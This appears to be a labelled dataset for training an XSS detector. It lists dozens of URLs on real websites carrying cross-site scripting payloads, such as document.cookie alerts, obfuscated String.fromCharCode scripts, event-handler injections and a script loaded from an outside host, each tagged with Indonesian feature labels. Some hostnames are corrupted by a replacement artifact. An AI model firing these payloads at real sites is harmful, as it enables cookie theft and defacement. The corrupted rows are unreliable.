method;XSS\r\nhttp://client.eveonline.com/patches/patches_nolayout.asp?s=%22%3E%3Cbody%20onload=alert%28%22XSS_by_Timse%22%29%3E&system=win;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://client.skype.tom.com/product/index.php?form_country=%E7%BE%8E%E5%9B%BD%22%3E%3CscRipt%3Ealert%28document.cookie%29%3C/SCript%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://comidaslaredo.com/?m=cat&id=%27%3E%3Ciframe%20src=http://xssed.com%3E%3C/iframe%3E%3Cimg%20src=http://img848.imageshack.us/img848/8906/screenshot2012040516455.png%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://commondatastorage.googleapis.com/chromium-browser-continuous/index.html?path=%22%3E%3Cscript%3Ealert(%27XSS%27)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://cook.boom.ge/?&m=516&search_products=%22%20onmouseover%3dprompt%28917862%29%20bad%3d%22;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://cricketnext.in.com/search/searchnews.php?search_value=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E&x=0&y=0;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://cyber.law.harvard.edu/stockspam/public/onemsg.php?symbol=%3Ch1%3E%3Cscript%3Ealert%28/hacked/%29%3C/script%3E%3C/h1%3E&id=58873%22%27--;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://de.prediBlank atau CTOr.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://de.truveo.com/search?query=%22%3E%3C%2Ftitle%3E%3Cscript%3Ealert%28%22XSS+%22%29%3C%2Fscript%3E%3Ciframe+src+%3Dhttp%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DwOCCgblEvcE%22+width%3D%221000%22+height%3D%221000%22+\\%3E%3C%2Fdiv%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://disneyland.disney.go.com/?name=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3E[XSS%27D%20by%20X3R0%20|%20ProHack%20]%3C/h1%3E%3C/marquee%3E&bhcp=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3E[XSS%27D%20by%20X3R0%20|%20ProHack%20]%3C/h1%3E%3C/marquee%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://doctor.ndtv.com/Search.aspx?SearchText=harvey%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E&site=searchtextbox-5555;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://dreamshield.developpez.com/index.php?n=Main.WikiSandbox?from=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://duvidas.pandasecurity.com.br/index.php?bp=50|77|2|51|2&View=search&q=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E&s=1&sb=Procurar;Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://ec.europa.eu/justice/fdad/cms/stopdiscrimination/config/searchresult.html?query=%3Cbr/%3E%3Ch1%3EClassification%20of%20Humans%3C/h1%3E%201%20real%20item%20found%20:%3Cbr/%3E%3Cimg%20src=%22http://3.bp.blogspot.com/-Vx_myZeyHJM/ThZgAK5etcI/AAAAAAAAIP4/8CJLtUlti5I/s1600/tintin-au-congo-decision-le-5-mai-2010-01.jpg%22/%3E&x=11&y=7;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://edition.cnn.com/search/index.html?sortBy=date&primaryType=mixed&source=money&query=%22%3E%3Ciframe+onload%3Dalert%28%2FXSS%2F%29%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://email.one.lt/index.html?email-id=2&layout=%3Ciframe%20src=%22http://XSSed.com%22%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://en.prediBlank atau CTOr.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://english.sinopec.com/investor_center/historyQuery.jsp?d=%22%20onmouseover%3dalert%28document.c ookie%29%20abc%3d%22&dayend=23&daystart=23&doSearch=true&endDate=2012-03-06&gid=1&monthend=3&monthst art=3&range=1&startDate=2000-10-19&Submit2=search&yearend=1967&yearstart=1967;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://es.prediBlank atau CTOr.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://estadisticas.idc.enet.cu/index.php?site=%27;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//\\%27;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//%22;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//\\%22;alert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%28120,68,97,114,107,83,116,111,110,51,120,32,32,88,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://europa.eu/youth/forgotpass.cfm?cPage=2&l_id=EN&mail=%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://fa.austenco.ir/content.asp?CatId=276&ContentType=%3Cscript%3Ealert%28%22amirmagic%22%29%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://fantasygolfguide.com/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://filmtrailer.msn.se/index.php?module=filmnews&operation=\"\"><script>alert(document.cookie)</script>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://find.scourt.go.kr/cgi-bin/homepage.cgi?option=FULL&query=\"\"><script>alert(123)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://forum.alsacreations.com/topic.php?tid=30093&searchintopic=%2F%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E&fid=2&tid=30093;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://fr.prediBlank atau CTOr.fifa.com/M/stats.mc?phase=2%3E%22%3E%3CScRiPt%20%0A%0D%3Ealert(%27XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20:D%27)%3B%3C/ScRiPt%3E%3Ch1%3EXSS%20By%20TurKPoweR%20-%20FROM%20TURKEY%20-%20HELLO%20FIFA%20%20:D%3C/h1%3E%3C/marquee%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://france-engels.fr/search_form.php?lang=fr/\"\"><script>alert('Xss By Atm0n3r')</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://fta.inria.fr/apache2-default/pmwiki/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://fzr78.multiply.com/guestbook%7D%3C/style%3E43%27%22%3E%3C/title%3E%3Cscript%3Ea=eval;b=alert;a(b(/XSS/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EXSS%3C/h1%3E%3C/marquee%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://gaana.com/#/playlists/\"\"/></script><script>alert(\"\"Xss: Vijayendra\"\")</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://games.ru.msn.com/?FORM=MSNRUC&mkt=ru-ru&act=search&query=%22%3E%3CSCRIPT+src=http://ltvn.pisem.net/aa.js+%3E%3C/SCRIPT%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Terdapat HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://gamezone.impaqmsn.com/gamelist.asp?fl=genre%2Ename&kw=>\"\">alert(/XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY/)%3B</ScRiPt><h1>XSS%20By%20TurKPoweR%20-%20FROM%20TURKEY</h1>\";Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://geeks.ues.edu.sv/wiki/index.php?n=Main.WikiSandbox?from=%22/><body onload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://ghrc.nsstc.nasa.gov/hydro/search.pl?hydro&pr=<script>alert('cyberbellona')</script>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://giochi.mobile.it.msn.com/cerca.php?search=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://gmwgroup.harvard.edu/techniques/index.php?topic=http://gmwgroup.harvard.edu/techniques/index.php?topic=%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain berbeda;Tersimpan di database whois;Ada obfuscated;Ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Tidak ada javascript method;XSS\r\nhttp://goodtimes.ndtv.com/video/video.aspx?id=52733%22%3E%27%3E%3Cscript%3Ealert(/Hey%20do%20you%20know%20that%20it%20is%20boring%20T.T/)%3C/script%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://goodtimes.ndtv.com/video/videosearchlisting.aspx?keyword='>\"\"><script>alert(/Hexon/)</script>\";Lebih dari 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://goynuk.org/?s=%22%3E%3Cscript%3Ealert%28%223spi0n%22%29%3C/script%3E;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://groups.csail.mit.edu/EVO-DesignOpt/GPBenchmarks/index.php?n=Main.WikiSandbox?from=%22/><bodyonload=alert(1)>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://guides.hcl.harvard.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://guides.lib.uchicago.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://guides.lib.uiowa.edu/searchtags.php?iid=&tag=%27;alert%28String.fromCharCode%2888,83,83%29%29//\\%27;alert%28String.fromCharCode%2888,83,83%29%29//%22;alert%28String.fromCharCode%2888,83,83%29%29//\\%22;alert%28String.fromCharCode%2888,83,83%29%29//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28String.fromCharCode%2888,83,83%29%29%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\n\"http://guides.lib.virginia.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://guides.lib.washington.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://guides.library.duke.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://guides.library.manoa.hawaii.edu/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\n\"http://guides.slsa.sa.gov.au/searchtags.php?iid=&tag=%27;alert(String.fromCharCode(88,83,83))//\\%27;alert(String.fromCharCode(88,83,83))//%22;alert(String.fromCharCode(88,83,83))//\\%22;alert(String.fromCharCode(88,83,83))//--%3E%3C/SCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E\";Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://h30429.www3.hp.com/redirect.jsp?r=1&url=http://st2tea.blogspot.com;Antara 54 dan 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://haber.ok.net/sorgula.html?sorgula=true&anahtar=%22%3E%3C/title%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\n\"http://harajiharaji.com/login.php?email=\"\" onmouseover=alert(/a3q/) bad=\"\"\";Antara 54 dan 75;Tidak ada Port;Terdapat special character;Tidak ada duplicated character;Blank atau CTO;Tidak tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Terdapat EventHandler;Tidak ada DOM objects;Terdapat javascript method;XSS\r\nhttp://hms.harvard.edu/faculty-search/?FirstName=%3C/h2%3E%3Cscript%3Ealert%28/xss/%29%3C/script%3E&LastName=%3Cscript%3Ealert%28/xss2/%29%3C/script%3E&s=1;Lebih dari 75;Tidak ada Port;Tidak ada special character;Tidak ada duplicated character;Blank atau CTO;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party domain;Tidak ada request cookie;Tidak ada HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Tidak ada DOM objects;Tidak ada javascript method;XSS\r\nhttp://hosted.x-art.com/galleries/secret_place/view_image.php?img_num=10<script>alert(document.cookie)</script>;Lebih dari 75;Tidak ada Port;Tidak ada special character;Terdapat duplicated character;Blank atau CTO;Tersimpan di database whois;Tidak obfuscated;Tidak ada third-party domain;Ada request cookie;Terdapat HTML tags;Tidak ada HTML properties;Tidak ada EventHandler;Terdapat DOM objects;Terdapat javascript method;XSS\r\nhttp://img.virscan.org/js.php?js=%27%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(/meeh%20infected/)%3C/script%3E%3C/title%3E%3Cmarquee%3E%3Ch1%3EXSS%20:)%3C/h1%3E%3Cmarquee%3E%3Cstrong%3E%3Cblink%3EXSS%20TEST%3C/blink%3E%3C/strong%3E%3C/marquee%3E%3Ch1%20%20%3EXSS%20:)%3C/h1%3E%3C/marquee%3E;Lebih dari 75;Tidak ada Port;Terdapat special character;Terdapat duplicated character;Mengarah ke domain sendiri;Tersimpan di database whois;Ada obfuscated;Tidak ada third-party 